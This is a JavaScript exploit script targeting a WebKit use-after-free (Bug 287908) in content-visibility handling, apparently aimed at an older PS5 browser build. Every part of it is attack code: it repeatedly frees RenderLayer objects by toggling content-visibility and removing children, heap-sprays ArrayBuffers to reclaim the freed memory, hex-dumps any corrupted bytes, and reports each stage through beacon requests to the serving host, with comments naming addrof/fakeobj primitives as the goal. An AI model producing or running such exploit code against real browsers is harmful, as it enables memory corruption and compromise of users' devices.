// p186 — content-visibility UAF (WebKit Bug 287908)
// RenderLayer freed during content-visibility transition, accessed during
// compositing traversal. Fix: commit 295285@main (May 2025).
// WebKit-1200 (Dec 2023) = VULNERABLE.
//
// Trigger: content-visibility hidden → remove child → auto → freed layer accessed
// The fix was in RenderLayer::setIsHiddenByOverflowTruncation — it only dirtied
// the immediate layer, not ancestors. computeCompositingRequirements traverses
// the positive z-order list of a layer that has already been freed.
//
// Phase 1: Detect if content-visibility is supported
// Phase 2: Trigger UAF with heap spray to reclaim freed RenderLayer
// Phase 3: Read back controlled data for addrof/fakeobj primitives
//
// Beacon prefix: V186-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V186-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // ================================================================
  // Phase 1: Detect content-visibility support
  // ================================================================
  var hasCV = false;
  try {
    var testEl = document.createElement('div');
    document.body.appendChild(testEl);
    testEl.style.contentVisibility = 'hidden';
    hasCV = (testEl.style.contentVisibility === 'hidden');
    if (!hasCV) {
      testEl.style.setProperty('content-visibility', 'hidden');
      hasCV = (getComputedStyle(testEl).getPropertyValue('content-visibility') === 'hidden');
    }
    testEl.remove();
  } catch(e) {}

  syncB('CV-' + (hasCV ? 'YES' : 'NO'));

  if (!hasCV) {
    syncB('NO-CV-ABORT');
    // Still run the other probes for info
    return;
  }

  // ================================================================
  // Phase 2: UAF trigger with heap spray
  // ================================================================

  // Spray parameters — RenderLayer on PS5 is likely 200-400 bytes
  // libpas bmalloc heap, marge tier for objects in this size range
  var SPRAY_SIZE = 256;        // Target RenderLayer size
  var SPRAY_COUNT = 5000;      // Number of spray objects
  var TRIGGER_ROUNDS = 100;    // Number of UAF trigger attempts
  var CHILD_COUNT = 8;         // Children per container (more = more layers)

  var round = 0;
  var alive = true;
  var sprays = [];

  function heapSpray() {
    // Spray Uint8Arrays to reclaim freed RenderLayer memory
    sprays = [];
    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      var view = new Uint8Array(ab);
      // Fill with recognizable pattern
      // First 8 bytes: marker
      view[0] = 0x41; view[1] = 0x41; view[2] = 0x41; view[3] = 0x41;
      view[4] = 0x42; view[5] = 0x42; view[6] = 0x42; view[7] = 0x42;
      // Bytes 8-15: spray index (for identification)
      view[8] = (i >> 0) & 0xff;
      view[9] = (i >> 8) & 0xff;
      view[10] = (i >> 16) & 0xff;
      view[11] = (i >> 24) & 0xff;
      // Fill remaining with 0x43
      for (var j = 12; j < SPRAY_SIZE; j++) {
        view[j] = 0x43;
      }
      sprays.push(ab);
    }
  }

  function triggerUAF() {
    if (!alive || round >= TRIGGER_ROUNDS) {
      syncB('UAF-DONE-' + round);
      return;
    }
    round++;

    // Create a container with content-visibility support
    var container = document.createElement('div');
    container.style.cssText = 'position:relative;width:300px;height:300px;overflow:hidden;contain:layout style paint;';
    document.body.appendChild(container);

    // Create children with z-index to force compositing layers
    var children = [];
    for (var i = 0; i < CHILD_COUNT; i++) {
      var child = document.createElement('div');
      child.style.cssText = 'position:relative;z-index:' + (i + 1) + ';width:100px;height:50px;background:rgb(' + (i*30) + ',0,0);contain:strict;';
      // Add sub-children to increase layer complexity
      var sub = document.createElement('div');
      sub.style.cssText = 'position:absolute;top:10px;left:10px;width:50px;height:30px;background:blue;z-index:10;';
      child.appendChild(sub);
      container.appendChild(child);
      children.push(child);
    }

    // Force initial layout
    void container.offsetHeight;

    // Step 1: Set content-visibility to hidden (changes layer visibility)
    container.style.contentVisibility = 'hidden';

    // Force layout to process the visibility change
    void container.offsetHeight;

    // Step 2: Remove children while visibility is hidden
    // This frees RenderLayer objects for the children
    for (var i = 0; i < children.length; i++) {
      children[i].remove();
    }
    children = null;

    // Step 3: Heap spray to reclaim freed RenderLayer memory
    heapSpray();

    // Step 4: Toggle content-visibility back to 'auto'
    // This triggers computeCompositingRequirements which traverses
    // the positive z-order list — but the layers were freed
    setTimeout(function() {
      try {
        container.style.contentVisibility = 'auto';

        // Force the compositing traversal
        void container.offsetHeight;

        // Also try forcing a full paint
        container.style.width = '301px';
        void container.offsetHeight;
        container.style.width = '300px';
        void container.offsetHeight;

      } catch(e) {
        syncB('UAF-CATCH-' + round + '-' + (e.message || '').substring(0, 30));
      }

      // Check if we're still alive (if we crashed, this won't run)
      syncB('UAF-ALIVE-' + round);

      // Check spray integrity
      var corrupted = 0;
      var corruptedIdx = -1;
      for (var i = 0; i < sprays.length; i++) {
        var v = new Uint8Array(sprays[i]);
        // Check if the marker was overwritten
        if (v[0] !== 0x41 || v[1] !== 0x41 || v[4] !== 0x42 || v[5] !== 0x42) {
          corrupted++;
          if (corruptedIdx === -1) corruptedIdx = i;
        }
      }

      if (corrupted > 0) {
        syncB('CORRUPT-' + corrupted + '-FIRST-' + corruptedIdx);
        // Read corrupted data
        var cv = new Uint8Array(sprays[corruptedIdx]);
        var hexDump = '';
        for (var j = 0; j < 32 && j < SPRAY_SIZE; j++) {
          hexDump += ('0' + cv[j].toString(16)).slice(-2);
        }
        syncB('DUMP-' + hexDump);
      }

      container.remove();
      sprays = [];

      if (round % 10 === 0) syncB('ROUND-' + round);

      // Next round
      setTimeout(triggerUAF, 0);
    }, 0);
  }

  // Also set up a MutationObserver to increase reliability (from the PoC)
  // The observer re-triggers when DOM changes, creating more chances for the race
  var obsContainer = document.createElement('div');
  obsContainer.id = 'obs-root';
  document.body.appendChild(obsContainer);

  var observer = new MutationObserver(function(mutations) {
    // Mutations happening — good, this means the DOM tree is being modified
    // while layout may still be processing the content-visibility change
  });

  observer.observe(obsContainer, { childList: true, subtree: true });

  // Start the trigger loop
  syncB('START-TRIGGER');
  triggerUAF();

  // Timeout to stop
  setTimeout(function() {
    alive = false;
    observer.disconnect();
    syncB('TIMEOUT-STOP');
  }, 30000);

})();
